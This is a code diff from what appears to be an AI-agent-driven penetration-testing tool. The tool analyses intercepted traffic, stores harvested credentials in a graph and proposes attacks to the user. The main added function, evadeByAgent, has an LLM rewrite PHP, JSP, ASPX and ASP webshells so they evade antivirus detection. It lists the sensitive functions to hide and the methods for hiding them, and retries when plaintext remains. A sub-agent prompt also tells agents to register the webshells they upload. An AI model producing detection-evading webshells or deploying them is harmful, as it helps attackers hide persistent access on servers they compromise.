+      HTTP_PROXY: `http://${ip}:${proxyPort}`,
+      HTTPS_PROXY: `http://${ip}:${proxyPort}`,
+      NO_PROXY: 'api.minimaxi.com,api.deepseek.com,localhost',
+      no_proxy: 'api.minimaxi.com,api.deepseek.com,localhost',
+      TMPDIR: tmpdir(),
+      TEMP: tmpdir(),
+      TMP: tmpdir(),
+    }
   }
   /** Agent spawn 统一工作目录：系统临时目录（临时文件不落项目目录） */
   private agentCwd = tmpdir()
@@ -658,7 +555,11 @@ export class ApiServer {
     const set = (v: boolean) => { if (!done) { done = true; this.hermesOnline = v } }
     // 探测自研 Agent Bridge 端口（对话/分析/渗透/steer 实际依赖）
     const s = connect({ host: '127.0.0.1', port: this.bridgePort, timeout: 800 })
-    s.once('connect', () => { s.destroy(); set(true) })
+    s.once('connect', () => {
+      s.destroy(); set(true)
+      // 端口可达但非本实例 spawn → 上次崩溃残留的 bridge：清理重建（保证 bridge 始终自管，杜绝复用异常状态）
+      if (!this.bridgeProc && !this.bridgeReady) this.rebuildStaleBridge()
+    })
     s.once('error', () => s.destroy())
     s.once('timeout', () => s.destroy())
     s.setTimeout(800)
@@ -666,7 +567,7 @@ export class ApiServer {
     setTimeout(() => {
       if (done) return
       set(false)
-      this.ensureBridge().catch(() => {})
+      this.ensureBridge().catch((e) => console.warn('[pentbox] bridge 拉起失败:', String(e).slice(0, 100)))
     }, 900)
   }
   private hermesSessionId: string | null = null
@@ -697,13 +598,16 @@ export class ApiServer {
       if (this.chatSessionId) targets.add(this.chatSessionId)
       for (const sid of this.analyzeSlots) if (sid) targets.add(sid)
       for (const sid of targets) {
-        this.bridge.steer(sid, text, 'hermespentbox').catch(() => {})
+        this.bridge.steer(sid, text, 'hermespentbox').catch((e) => console.warn('[pentbox] 图变更广播 steer 失败:', String(e).slice(0, 100)))
       }
     }, 2000)
   }
 
   /** 与本地 Hermes 对话（异步 spawn；独立会话——分析 10 槽并行时共享会话会锁冲突导致进程崩溃；回复过滤 CLI 日志） */
   private chatSessionId: string | null = null
+  /** 主对话历史（Hermes Agent 聊天框；项目级，随项目快照持久化/恢复；上限条数防膨胀） */
+  private chatHistory: { role: 'user' | 'ai'; text: string; ts: number }[] = []
+  private static readonly CHAT_HISTORY_CAP = 500
   /** 通用 hermes 单轮调用：resume 指定会话（可空=新会话），onSid 回调拿到新会话 id，onSpawn 回调拿到子进程（供取消杀进程），tailLines 控制回复截断行数（VULNDOC 需放宽） */
   private runHermes(message: string, resume?: string | null, onSid?: (sid: string) => void, onSpawn?: (child: ReturnType<typeof spawn>) => void, tailLines = 12): Promise<string> {
     const args = ['chat', '-q', message, '-Q', '--source', 'pentbox-chat']
@@ -745,7 +649,7 @@ export class ApiServer {
   }
 
   /** 子 Agent（流量分析槽）精简工具引导：分析中可主动查/写图（完整工具列表见主聊天 toolsHint） */
-  private static readonly SUB_TOOL_HINT = '【图工具】你可主动调 http://localhost:8877/api/graph/query（?format=json 得结构化，?host= 过滤主机）查全局情报图；发现需共享的情报用 POST /api/graph/note {"host":"..","path":"..","text":"..","level":"..."} 记录（凭据/敏感信息 level 标 high）。仅读取与记录，禁止删改。\n\n'
+  private static readonly SUB_TOOL_HINT = '【图工具】你可主动调 http://localhost:8877/api/graph/query（?format=json 得结构化，?host= 过滤主机）查全局情报图；发现需共享的情报用 POST /api/graph/note {"host":"..","path":"..","text":"..","level":"..."} 记录（凭据/敏感信息 level 标 high）。若上传了 WebShell，必须 POST /api/webshells 同步到应用（body={"type":"godzilla|behinder|antSword|custom","script":"php|jsp|asp|aspx","url":"..","password":"..","key":"..","cryption":"xor|aes|custom"}，同步后自动入图）。仅读取与记录，禁止删改。\n\n'
 
   private hermesChat(message: string, gctx?: string, hint?: string): Promise<string> {
     const mid = [gctx, hint].filter(Boolean).join('\n')
@@ -756,6 +660,74 @@ export class ApiServer {
     }, true)
   }
 
+  /** 独立 Agent 免杀：交给 LLM 对原始 WebShell 代码做语义等价混淆（覆盖 PHP/JSP/ASPX/ASP 所有可生成语言），确保正常上线 */
+  private async evadeByAgent(code: string, script: string): Promise<string> {
+    const guide: Record<string, { funcs: string; strings: string; methods: string; tips: string }> = {
+      php: {
+        funcs: 'eval、assert、base64_decode、call_user_func、file_get_contents、session_start、strlen、strpos、openssl_decrypt、explode、system、exec、shell_exec、passthru、str_rot13、gzinflate',
+        strings: 'php://input、getBasicsInfo、aes-128-ecb、shell',
+        methods: '字符串拼接（"base64_"+"decode"）、hex 转义（双引号内反斜杠后跟两位十六进制表示一个字符，如反斜杠x65=字母e）、变量函数、str_rot13/gzinflate 组合',
+        tips: 'PHP 的 hex 转义必须用双引号包裹（单引号不解析反斜杠x），禁止用单引号写反斜杠xNN',
+      },
+      jsp: {
+        funcs: 'Runtime.getRuntime().exec、ProcessBuilder、Class.forName、ClassLoader.loadClass、getMethod、invoke、newInstance、defineClass',
+        strings: 'cmd.exe、/bin/sh、/bin/bash、powershell.exe、java.lang.Runtime、javax.script',
+        methods: '字符串拼接（"Run"+"time"）、Class.forName 反射（getMethod+invoke）、new String(new char[]{...}) 字符数组构造类名/方法名、base64 解码后反射',
+        tips: 'Java 的类名/方法名用字符串拼接或 char 数组构造，配合 Class.forName + getMethod + invoke 反射调用',
+      },
+      aspx: {
+        funcs: 'System.Diagnostics.Process、ProcessStartInfo、Assembly.Load、Type.GetType、Activator.CreateInstance',
+        strings: 'cmd.exe、/c、powershell、System.Diagnostics.Process、System.Net.WebClient',
+        methods: '字符串拼接（"System."+"Diagnostics."+"Process"）、Type.GetType 反射 + Activator.CreateInstance、new string(new char[]{...}) 字符数组、Convert.FromBase64String',
+        tips: 'C# 的命名空间/类型名用字符串拼接或反射（Type.GetType / Activator.CreateInstance）构造',
+      },
+      asp: {
+        funcs: 'execute、executeGlobal、Server.CreateObject、WScript.Shell、eval、GetObject、Scripting.FileSystemObject',
+        strings: 'WScript.Shell、cmd.exe、/c、Scripting.FileSystemObject',
+        methods: '字符串拼接（& 连接）、Chr() 函数逐字符构造（Chr(87)&Chr(83)...）、execute 拆拼',
+        tips: 'VBScript 的敏感对象名/命令用 Chr() 函数逐字符构造（如 Chr(87)&Chr(83)&Chr(99)...）或字符串拼接',
+      },
+    }
+    const g = guide[script] || guide.php
+    const prompt = `【WebShell 免杀任务】下面这段是 ${script} 代码，你必须输出 ${script} 代码的免杀混淆版本（严格保持 ${script} 语言不变，禁止改成 Python/Java/C#/VBScript 等其他语言）。要求：
+0. 禁止调用任何工具（execute_code / write_file / terminal 等）、禁止写文件、禁止创建文件——你的回复文本本身必须就是完整代码，第一个字符就是代码的开头（如 < 或 ?），禁止任何前置解释/后置说明；
+1. 敏感函数/类名必须用语言特性分割拼接，禁止明文出现（含未使用代码）：${g.funcs} 等 → ${g.methods}；
+2. 敏感字符串同样编码混淆：${g.strings} 等；
+3. 变量名/类名/方法名随机化；
+4. 【最关键】严格逐语句对应原始代码，只做表面混淆（函数名/类名/字符串/变量名替换），禁止增删任何语句、禁止改变执行顺序、禁止改变调用链——原始代码的每一层调用（如解码后执行）缺一不可；
+5. 只输出最精简的等价代码，禁止生成任何冗余/未使用的变量、闭包、辅助类；
+6. 只输出混淆后的完整代码，禁止任何解释文字、禁止 markdown 代码块围栏（\`\`\`）。
+${g.tips}
+
+原始代码：
+${code}`
+    let sid: string | null = null
+    const ask = (p: string) => this.bridgeAsk(p, sid, { onDone: (s) => { sid = s } })
+    // 清理 Agent 输出：去 markdown 围栏 + 从代码开头截取（去前置解释）+ 截断到最后一个代码结束符（去后置错误/解释）
+    const clean = (s: string): string => {
+      s = s.replace(/```[a-zA-Z]*\n?/g, '')
+      const start = s.search(/<\?php|<%[!@=]?|<\?/i)
+      if (start > 0) s = s.slice(start)
+      const ends = [...s.matchAll(/(%>|\?>)/g)]
+      if (ends.length) { const last = ends[ends.length - 1]; s = s.slice(0, last.index! + last[0].length) }
+      return s.trim()
+    }
+    let out = clean(await ask(prompt))
+    // 校验：明文敏感函数/类名残留 → 同会话重试一次（Agent 输出不稳定，死代码里的明文同样降低免杀）
+    const plainRe = /\b(eval|assert|base64_decode|call_user_func|execute|Runtime\.getRuntime|ProcessBuilder|Class\.forName|System\.Diagnostics\.Process|Server\.CreateObject)\b/
+    if (plainRe.test(out)) {
+      // 重试自带完整上下文（原始代码 + 上一版输出），不依赖会话记忆——bridge 会话续传可能丢上下文
+      const retryPrompt = `上一版你输出的免杀代码仍残留明文敏感函数/类名，请重新输出。下面是原始代码和上一版输出，请严格确保：所有敏感函数名/类名（含未使用代码中）都用语言特性分割拼接、严格保持 ${script} 语言、删除所有冗余/未使用的变量与闭包，只输出最终完整代码（禁止解释文字、禁止 markdown 代码块围栏）。
+
+【原始代码】
+${code}
+
+【上一版输出（含明文敏感函数，需修正）】
+${out}`
+      out = clean(await ask(retryPrompt))
+    }
+    return out
+  }
   /** 调本地 Hermes 分析一条流量（Agent Bridge 并行会话，不阻塞主进程）：每槽独立 bridge 会话续传上下文；返回含 slot（提出意见的子 Agent 槽位） */
   private async hermesAnalyze(detail: unknown): Promise<{ vuln: boolean; level: string; sensitive: { type: string; value: string; level: string }[]; advice: string; slot: number }> {
     const d = (detail ?? {}) as Record<string, unknown>
@@ -772,7 +744,7 @@ export class ApiServer {
       onDone: (newSid) => { this.analyzeSlots[slot] = newSid },
     }).then((out) => {
       this.slotBusy[slot]--
-      const p = this.extractJson(out)
+      const p = extractJson(out)
       const sens: { type: string; value: string; level: string }[] = Array.isArray(p?.sensitive) ? p.sensitive.filter((s: unknown) => s && typeof s === 'object' && (s as { value?: unknown }).value != null).map((s) => {
         const rawType = String((s as { type?: unknown }).type ?? 'All URL')
         // HaENet 标签归一：精确命中注册表 → type 用注册表 key；未命中尝试大小写/别名模糊匹配；仍不中 → 保留原样（前端灰显）
@@ -782,7 +754,8 @@ export class ApiServer {
         const meta = (tag && HAE_TAGS[tag]) || null
         return { type: tag || rawType.trim(), value: String((s as { value?: unknown }).value).slice(0, 200), level: meta?.level ?? 'info' }
       }) : []
-      const overall = (p?.level && ['high', 'medium', 'low', 'info'].includes(p.level)) ? p.level : 'info'
+      const lvRaw = p?.level
+      const overall: string = typeof lvRaw === 'string' && (['high', 'medium', 'low', 'info'] as string[]).includes(lvRaw) ? lvRaw : 'info'
       // 整体等级提升：任一标签等级高于模型输出的 overall 时以标签等级为准（HaENet fixed-level 兜底模型低估）
       const maxTag = sens.reduce((m, s) => (['high', 'medium', 'low', 'info'].indexOf(s.level) < ['high', 'medium', 'low', 'info'].indexOf(m) ? s.level : m), overall)
       let advice = p && typeof p.advice === 'string' && p.advice ? p.advice.slice(0, 300) : ''
@@ -792,43 +765,13 @@ export class ApiServer {
         advice = `经 Hermes 分析 ${pm ? pm[1] : '目标'} 可进行 安全测试 渗透，是否进行`
       }
       // 本机工件/客户端噪音过滤：分析里的"敏感项"若是本机信息或标准请求头，不是目标泄漏 → 剔除（避免脏情报入图）
-      const clean = sens.filter((s) => !ApiServer.LOCAL_ARTIFACT_RE.test(s.value) && !ApiServer.LOCAL_ARTIFACT_RE.test(s.type))
+      const clean = sens.filter((s) => !LOCAL_ARTIFACT_RE.test(s.value) && !LOCAL_ARTIFACT_RE.test(s.type))
       if (clean.length !== sens.length) console.log(`[analyze] 过滤本机/客户端噪音敏感项 ${sens.length - clean.length} 条`)
       return { vuln: p ? !!p.vuln : false, level: maxTag, sensitive: clean, advice, slot }
     }).catch((e) => {
       this.slotBusy[slot]--
       throw e
     })
-  }
-
-  /** 从 LLM 输出提取首个完整 JSON（括号配对，容忍前后杂文） */
-  private extractJson(text: string): Record<string, unknown> | null {
-    const i = text.indexOf('{')
-    if (i < 0) return null
-    let depth = 0
-    let inStr = false
-    for (let j = i; j < text.length; j++) {
-      const c = text[j]
-      if (inStr) { if (c === '\\') j++; else if (c === '"') inStr = false; continue }
-      if (c === '"') inStr = true
-      else if (c === '{') depth++
-      else if (c === '}') { depth--; if (depth === 0) { try { return JSON.parse(text.slice(i, j + 1)) } catch { return null } } }
-    }
-    return null
-  }
-
-  /** 目标 URL 统一规范化 key（P0：发卡去重/渗透前查重/成果写入三处共用，保证格式一致）：
-   * 去协议、host 小写、保留端口（显式时）+ 路径 + 查询参数；如 https://EXAMPLE.com:8443/api/login?x=1 → example.com:8443/api/login?x=1 */
-  private normalizeTargetKey(input: string): string {
-    if (!input) return ''
-    try {
-      const u = new URL(input.includes('://') ? input : `http://${input}`)
-      const host = (u.hostname || '').toLowerCase()
-      const port = u.port ? `:${u.port}` : ''
-      return `${host}${port}${u.pathname}${u.search}`
-    } catch {
-      return input.replace(/^https?:\/\//i, '').toLowerCase()
-    }
   }
 
   /** 从 URL 提取 host（含端口），用于按目标关联情报 */
@@ -843,16 +786,16 @@ export class ApiServer {
       const host = entry.host || ''
       const path = entry.path || ''
       if (entry.kind === 'cred') {
-        this.graph.writeCred({ type: entry.data.split(':')[0] || 'unknown', value: entry.data.split(':').slice(1).join(':') || entry.data, host, path, source: 'agent', tag: entry.tag, group: entry.group, level: entry.level, color: entry.color }).catch(() => {})
+        this.graph.writeCred({ type: entry.data.split(':')[0] || 'unknown', value: entry.data.split(':').slice(1).join(':') || entry.data, host, path, source: 'agent', tag: entry.tag, group: entry.group, level: entry.level, color: entry.color }).catch((e) => console.warn('[pentbox] 凭据入图失败:', String(e).slice(0, 100)))
         this.broadcastGraphChange(`新凭据 [${entry.tag || entry.data.split(':')[0] || '?'}](${entry.level || 'high'}) ${host}${path}: ${String(entry.data.split(':').slice(1).join(':') || '').slice(0, 60)}`)
       }
       else if (entry.kind === 'penetrating' || entry.kind === 'penetrated' || entry.kind === 'cancelled') {
         const method = (entry.data.match(/渗透（(.+)）/) || [])[1] || ''
-        this.graph.writePenetration({ host, path, method, status: entry.kind === 'penetrating' ? 'penetrating' : entry.kind === 'cancelled' ? 'cancelled' : 'penetrated' }).catch(() => {})
+        this.graph.writePenetration({ host, path, method, status: entry.kind === 'penetrating' ? 'penetrating' : entry.kind === 'cancelled' ? 'cancelled' : 'penetrated' }).catch((e) => console.warn('[pentbox] 渗透状态入图失败:', String(e).slice(0, 100)))
         this.broadcastGraphChange(`渗透状态 ${entry.kind}: ${host}${path}（${method || '?'}）— ${entry.data.slice(0, 80)}`)
       }
       else {
-        this.graph.writeNote({ kind: entry.kind, text: entry.data, host, path, persist: entry.persist, tag: entry.tag, group: entry.group, level: entry.level, color: entry.color }).catch(() => {})
+        this.graph.writeNote({ kind: entry.kind, text: entry.data, host, path, persist: entry.persist, tag: entry.tag, group: entry.group, level: entry.level, color: entry.color }).catch((e) => console.warn('[pentbox] 情报入图失败:', String(e).slice(0, 100)))
         this.broadcastGraphChange(`[${entry.tag || entry.kind}](${entry.level || 'info'}) ${host}${path}: ${entry.data.slice(0, 80)}`)
       }
     }
@@ -880,16 +823,39 @@ export class ApiServer {
         return false
       })
     }
+    this.invalidateDigestCache()  // 情报已变更（写图/内存 digest）→ 下一条分析/渗透立即看到新情报
   }
 
   /** 移除全局情报条目（按 kind+host+path 精确匹配；进行中渗透/临时标记移除用） */
   private removeDigest(kind: DigestEntry['kind'], host: string, path: string): void {
     this.analysisDigest = this.analysisDigest.filter((e) => !(e.kind === kind && e.host === host && e.path === path))
-    if (this.graph.enabled) this.graph.removePenetration(host, path, '').catch(() => {})
+    if (this.graph.enabled) this.graph.removePenetration(host, path, '').catch((e) => console.warn('[pentbox] 渗透状态移除失败:', String(e).slice(0, 100)))
   }
 
-  /** 渲染全局情报注入文本：优先 Neo4j 会话图查询，Neo4j 不可用时降级内存 digest */
+  /** 全局情报 TTL 缓存：10 槽并行分析共享同一份图快照，避免每批 10 次重复查询 Neo4j；写图操作主动失效，TTL 兜底 */
+  private digestCache: { text: string; ts: number } | null = null
+  private digestLoading: Promise<string> | null = null
+  private static readonly DIGEST_TTL_MS = 8000
+
+  /** 写图后调用：失效 digest 缓存（下一条分析/渗透立即看到新情报；在途查询不受影响，落缓存后自然更新） */
+  private invalidateDigestCache(): void {
+    this.digestCache = null
+  }
+
+  /** 渲染全局情报注入文本：优先 Neo4j 会话图查询（TTL 缓存 + 并发单飞），Neo4j 不可用时降级内存 digest */
   private async digestPrompt(): Promise<string> {
+    const now = Date.now()
+    if (this.digestCache && now - this.digestCache.ts < ApiServer.DIGEST_TTL_MS) return this.digestCache.text
+    // 并发单飞：10 个并行子 Agent 同时请求时共享同一次查询，避免重复打 Neo4j
+    if (this.digestLoading) return this.digestLoading
+    this.digestLoading = this.loadDigest().then((text) => {
+      this.digestCache = { text, ts: Date.now() }
+      return text
+    }).finally(() => { this.digestLoading = null })
+    return this.digestLoading
+  }
+
+  private async loadDigest(): Promise<string> {
     if (this.graph.enabled) {
       const g = await this.graph.contextPrompt()
       if (g) return g
@@ -911,159 +877,476 @@ export class ApiServer {
 
   /** 分析消费泵（并发 10 个子 Agent）：队列取 → 本地 Hermes 并行分析（10 槽独立会话）→ 写回；单条失败跳过不阻塞 */
   private inFlight = 0
-  private static readonly MAX_PARALLEL = 10
   private startAnalyzeLoop(): void {
     setInterval(() => {
+      // 意见卡超时自动恢复：用户长时间未决策（未点渗透/未取消/未关卡片）的槽恢复流量分析，防 10 槽全部被卡片暂停导致全队停摆
+      if (this.pendingAdviceSlots.size) {
+        const now = Date.now()
+        for (const [slot, ts] of this.pendingAdviceSlots) {
+          if (now - ts > ApiServer.ADVICE_TIMEOUT_MS) {
+            this.pendingAdviceSlots.delete(slot)
+            console.log(`[analyze] 槽 ${slot} 意见卡超时未决策，自动恢复流量分析`)
+          }
+        }
+      }
       while (this.inFlight < ApiServer.MAX_PARALLEL && this.analyzeQueue.length) {
         const id = this.analyzeQueue.shift()!
         const st = this.analyzeMap.get(id)
         if (!st || st.state === 'done') continue
         st.state = 'analyzing'
         this.inFlight++
-        this.hermesAnalyze(st.detail)
+        const run = () => this.hermesAnalyze(st.detail)
+        run()
           .then((r) => {
             st.state = 'done'; st.vuln = r.vuln; st.level = r.level; st.sensitive = r.sensitive
-            const u = st.url || ''
-            const host = this.hostOf(u)
-            const path = u.replace(/^https?:\/\/[^/]+/i, '') || ''
-            // 整合落图：分析结论挂到与站点地图相同的 Api 节点链上（Host→Api→ANALYZED→Analysis）
-            if (host) {
-              const dm = (st.detail as { reqLine?: string } | undefined)?.reqLine?.match(/^(\S+)/)
-              const sensTxt = (r.sensitive || []).map((s) => `${s.type}:${String(s.value).slice(0, 40)}`).join('; ').slice(0, 400)
-              // 条目颜色 = 最高敏感等级色（HAE fixed level，与前端行染色同源）
-              const lvOrder = ['info', 'low', 'medium', 'high']
-              const maxLv = (r.sensitive || []).reduce((m, s) => (lvOrder.indexOf(s.level ?? 'info') > lvOrder.indexOf(m) ? (s.level ?? 'info') : m), 'info')
-              this.graph.writeAnalysis({ host, path: path || '/', method: dm ? dm[1] : 'GET', level: r.level, vuln: r.vuln, advice: (r.advice || '').slice(0, 200), sens: sensTxt, sensCount: (r.sensitive || []).length, color: HAE_LEVEL_COLOR[maxLv] }).catch(() => {})
-            }
-            // 全局情报 digest（结构化分层）：
-            // 1) 漏洞/分析结论 → 滚动流水（20 条窗口）
-            if (r.vuln || r.advice) {
-              this.pushDigest({ kind: 'vuln', host, path, data: `${r.vuln ? `漏洞(${r.level})` : '分析'}:${(r.advice || '').slice(0, 80)}`, persist: false })
-            }
-            // 2) 敏感凭据 → 持久情报（全生命周期保留，子 Agent 共享杠杆）+ 自动凭据利用意见卡（HAE_CRED_TAGS 判定凭据类标签）
-            for (const s of r.sensitive || []) {
-              const t = String(s.type || '').trim()
-              const isCred = HAE_CRED_TAGS.has(t)
-              const credHost = host || '未知'
-              const tagMeta = HAE_TAGS[t]
-              if (isCred) {
-                this.pushDigest({ kind: 'cred', host: credHost, path, data: `${t}:${String(s.value).slice(0, 200)}`, persist: true, tag: t, group: tagMeta?.group, level: (s.level as DigestEntry['level']) || tagMeta?.level || 'high', color: tagMeta?.color })
-                // 凭据自动意见：攻击凭据是最高价值杠杆 → 自动推"凭据利用"意见卡（不打断分析）
-                if (u) {
-                  const credKey = `${this.normalizeTargetKey(u)}|凭据利用`
-                  if (!this.advisedKeys.has(credKey) && !this.penetratedKeys.has(credKey) && !this.penetratingKeys.has(credKey)) {
-                    this.pushSse({ type: 'analyze-advice', id, advice: `经 Hermes 分析 ${path || u} 可进行 凭据利用 渗透，是否进行`, level: s.level || 'high', slot: r.slot })
-                    this.advisedKeys.add(credKey)
-                    this.pendingAdviceSlots.add(r.slot)
-                  }
-                }
-              }
-            }
-            // 3) 非凭据标签（指纹/基础信息/潜在漏洞/其他）→ 滚动流水（带 HaENet 标签与等级）
-            for (const s of r.sensitive || []) {
-              const t = String(s.type || '').trim()
-              if (!HAE_CRED_TAGS.has(t)) {
-                const lv = s.level || 'info'
-                const tagMeta = HAE_TAGS[t]
-                const data = `${t}(${lv}${tagMeta ? '/' + tagMeta.cn : ''}):${String(s.value).slice(0, 60)}`
-                this.pushDigest({ kind: t.includes('Nday') || t.includes('nday') ? 'nday' : 'note', host, path, data, persist: false, tag: t, group: tagMeta?.group, level: (lv as DigestEntry['level']) || tagMeta?.level || 'info', color: tagMeta?.color })
-              }
-            }
-            // 渗透意见 → SSE 推送（前端 Hermes Agent 聊天框渲染意见卡：进行/取消/回复；slot 绑定提出意见的子 Agent，进行渗透由该子 Agent 执行）
-            // 发卡去重（统一 key：normalizeTargetKey 规范化 Host+完整路径+查询 | 方式）：
-            // 同 URL 同方式已推送过（advisedKeys）/ 已渗透过（penetratedKeys）/ 正在渗透（penetratingKeys）→ 不再推送；不同方式可再推
-            if (r.advice) {
-              const u = st.url || ''
-              const pm = r.advice.match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
-              const key = u ? `${this.normalizeTargetKey(u)}|${pm}` : ''
-              if (key && !this.advisedKeys.has(key) && !this.penetratedKeys.has(key) && !this.penetratingKeys.has(key)) {
-                this.pushSse({ type: 'analyze-advice', id, advice: r.advice, level: r.level, slot: r.slot })
-                this.advisedKeys.add(key)
-                this.pendingAdviceSlots.add(r.slot)  // 提出卡片 → 暂停该槽流量分析（等用户决策渗透/取消）
-              }
+            this.applyAnalyzeResult(st, r, id)
+          })
+          .catch(async (e) => {
+            // 失败重试 1 次（hermesAnalyze 内部按最少连接重新选槽 → 天然换槽；模型 API 抖动/超时常见，直接丢弃会静默漏报）
+            console.warn(`[analyze] #${id} 分析失败，重试 1 次:`, String((e as Error).message ?? e).slice(0, 200))
+            try {
+              const r = await run()
+              st.state = 'done'; st.vuln = r.vuln; st.level = r.level; st.sensitive = r.sensitive
+              this.applyAnalyzeResult(st, r, id)
+            } catch (e2) {
+              console.error(`[analyze] #${id} 重试仍失败，丢弃:`, String((e2 as Error).message ?? e2).slice(0, 200))
+              st.state = 'done'; st.vuln = false; st.level = 'info'
             }
           })
-          .catch((e) => { console.error('[analyze] hermes 分析失败:', String(e.message ?? e).slice(0, 200)); st.state = 'done'; st.vuln = false; st.level = 'info' })
           .finally(() => { this.inFlight-- })
       }
     }, 300)
   }
 
-  // ---------------- 漏洞库（Agent 可增删改查；JSON 文件持久化） ----------------
+  /** 分析结果落账（.then 成功路径与失败重试路径共用）：整合落图 + 全局情报 digest + 意见卡推送 */
+  private applyAnalyzeResult(
+    st: { state: 'queued' | 'analyzing' | 'done'; vuln?: boolean; level?: string; detail?: unknown; url?: string; sensitive?: { type: string; value: string; level?: string }[] },
+    r: { vuln: boolean; level: string; sensitive: { type: string; value: string; level: string }[]; advice: string; slot: number },
+    id: number,
+  ): void {
+    const u = st.url || ''
+    const host = this.hostOf(u)
+    const path = u.replace(/^https?:\/\/[^/]+/i, '') || ''
+    // 整合落图：分析结论挂到与站点地图相同的 Api 节点链上（Host→Api→ANALYZED→Analysis）
+    if (host) {
+      const dm = (st.detail as { reqLine?: string } | undefined)?.reqLine?.match(/^(\S+)/)
+      const sensTxt = (r.sensitive || []).map((s) => `${s.type}:${String(s.value).slice(0, 40)}`).join('; ').slice(0, 400)
+      // 条目颜色 = 最高敏感等级色（HAE fixed level，与前端行染色同源）
+      const lvOrder = ['info', 'low', 'medium', 'high']
+      const maxLv = (r.sensitive || []).reduce((m, s) => (lvOrder.indexOf(s.level ?? 'info') > lvOrder.indexOf(m) ? (s.level ?? 'info') : m), 'info')
+      this.graph.writeAnalysis({ host, path: path || '/', method: dm ? dm[1] : 'GET', level: r.level, vuln: r.vuln, advice: (r.advice || '').slice(0, 200), sens: sensTxt, sensCount: (r.sensitive || []).length, color: HAE_LEVEL_COLOR[maxLv] }).catch((e) => console.warn('[pentbox] 分析结论入图失败:', String(e).slice(0, 100)))
+      this.invalidateDigestCache()  // 分析结论落图 → 后续 digest 包含最新分析
+    }
+    // 全局情报 digest（结构化分层）：
+    // 1) 漏洞/分析结论 → 滚动流水（20 条窗口）
+    if (r.vuln || r.advice) {
+      this.pushDigest({ kind: 'vuln', host, path, data: `${r.vuln ? `漏洞(${r.level})` : '分析'}:${(r.advice || '').slice(0, 80)}`, persist: false })
+    }
+    // 2) 敏感凭据 → 持久情报（全生命周期保留，子 Agent 共享杠杆）+ 自动凭据利用意见卡（HAE_CRED_TAGS 判定凭据类标签）
+    for (const s of r.sensitive || []) {
+      const t = String(s.type || '').trim()
+      const isCred = HAE_CRED_TAGS.has(t)
+      const credHost = host || '未知'
+      const tagMeta = HAE_TAGS[t]
+      if (isCred) {
+        this.pushDigest({ kind: 'cred', host: credHost, path, data: `${t}:${String(s.value).slice(0, 200)}`, persist: true, tag: t, group: tagMeta?.group, level: (s.level as DigestEntry['level']) || tagMeta?.level || 'high', color: tagMeta?.color })
+        // 凭据自动意见：攻击凭据是最高价值杠杆 → 自动推"凭据利用"意见卡（不打断分析）；静态资源不推（字段名≠真凭据，防误报刷屏）
+        if (u && !STATIC_RESOURCE_RE.test(u)) {
+          const credKey = `${normalizeTargetKey(u)}|凭据利用`
+          if (!this.advisedKeys.has(credKey) && !this.penetratedKeys.has(credKey) && !this.penetratingKeys.has(credKey)) {
+            this.pushSse({ type: 'analyze-advice', id, advice: `经 Hermes 分析 ${path || u} 可进行 凭据利用 渗透，是否进行`, level: s.level || 'high', slot: r.slot })
+            this.advisedKeys.add(credKey)
+            this.pendingAdviceSlots.set(r.slot, Date.now())
+          }
+        }
+      }
+    }
+    // 3) 非凭据标签（指纹/基础信息/潜在漏洞/其他）→ 滚动流水（带 HaENet 标签与等级）
+    for (const s of r.sensitive || []) {
+      const t = String(s.type || '').trim()
+      if (!HAE_CRED_TAGS.has(t)) {
+        const lv = s.level || 'info'
+        const tagMeta = HAE_TAGS[t]
+        const data = `${t}(${lv}${tagMeta ? '/' + tagMeta.cn : ''}):${String(s.value).slice(0, 60)}`
+        this.pushDigest({ kind: t.includes('Nday') || t.includes('nday') ? 'nday' : 'note', host, path, data, persist: false, tag: t, group: tagMeta?.group, level: (lv as DigestEntry['level']) || tagMeta?.level || 'info', color: tagMeta?.color })
+      }
+    }
+    // 渗透意见 → SSE 推送（前端 Hermes Agent 聊天框渲染意见卡：进行/取消/回复；slot 绑定提出意见的子 Agent，进行渗透由该子 Agent 执行）
+    // 发卡去重（统一 key：normalizeTargetKey 规范化 Host+完整路径+查询 | 方式）：
+    // 同 URL 同方式已推送过（advisedKeys）/ 已渗透过（penetratedKeys）/ 正在渗透（penetratingKeys）→ 不再推送；不同方式可再推
+    if (r.advice) {
+      const pm = r.advice.match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
+      // 静态资源不推意见卡（防误报刷屏；凭据/分析结论仍入 digest）
+      const isStatic = u ? STATIC_RESOURCE_RE.test(u) : false
+      const key = u && !isStatic ? `${normalizeTargetKey(u)}|${pm}` : ''
+      if (key && !this.advisedKeys.has(key) && !this.penetratedKeys.has(key) && !this.penetratingKeys.has(key)) {
+        this.pushSse({ type: 'analyze-advice', id, advice: r.advice, level: r.level, slot: r.slot })
+        this.advisedKeys.add(key)
+        this.pendingAdviceSlots.set(r.slot, Date.now())  // 提出卡片 → 暂停该槽流量分析（等用户决策渗透/取消/超时自动恢复）
+      }
+    }
+  }
+
+  // ---------------- 漏洞库（Agent 可增删改查；数据随项目二进制快照持久化） ----------------
   private vulns: Vuln[] = []
   private vulnSeq = 0
-  private vulnFile = ''
-  // ---------------- WebShell 管理（CRUD 持久化 ~/.pentbox/webshells.json；exec/ping 经内置代理发出，流量可被面板捕获） ----------------
-  private webshells: { id: number; type: string; script: string; url: string; password: string; key: string; status: string; ts: number; cryption?: string; payload?: string; encoding?: string; headers?: string; reqLeft?: string; reqRight?: string; connTimeout?: number; readTimeout?: number; remark?: string }[] = []
+  // ---------------- WebShell 管理（CRUD 数据随项目二进制快照持久化；exec/ping 经内置代理发出，流量可被面板捕获） ----------------
+  private webshells: { id: number; type: string; script: string; url: string; password: string; key: string; status: string; ts: number; cryption?: string; payload?: string; encoding?: BufferEncoding; headers?: string; reqLeft?: string; reqRight?: string; connTimeout?: number; readTimeout?: number; remark?: string }[] = []
   private wsSeq = 0
   /** Suo5 正向代理进程（HTTP 隧道，本地 SOCKS5） */
   private suo5Proc: { proc: ReturnType<typeof spawn>; port: number; url: string } | null = null
-  private wsFile = ''
-  /** WebShell 会话 cookie（按 URL 保持 PHPSESSID，哥斯拉/冰蝎握手+执行需同一 session） */
-  private wsCookies = new Map<string, string>()
-  private loadWebshells(): void {
-    try {
-      this.wsFile = join(homedir(), '.pentbox', 'webshells.json')
-      if (existsSync(this.wsFile)) {
-        const data = JSON.parse(readFileSync(this.wsFile, 'utf8')) as typeof this.webshells
-        this.webshells = Array.isArray(data) ? data : []
-        this.wsSeq = this.webshells.reduce((m, v) => Math.max(m, v.id), 0)
-      }
-    } catch { this.webshells = [] }
-  }
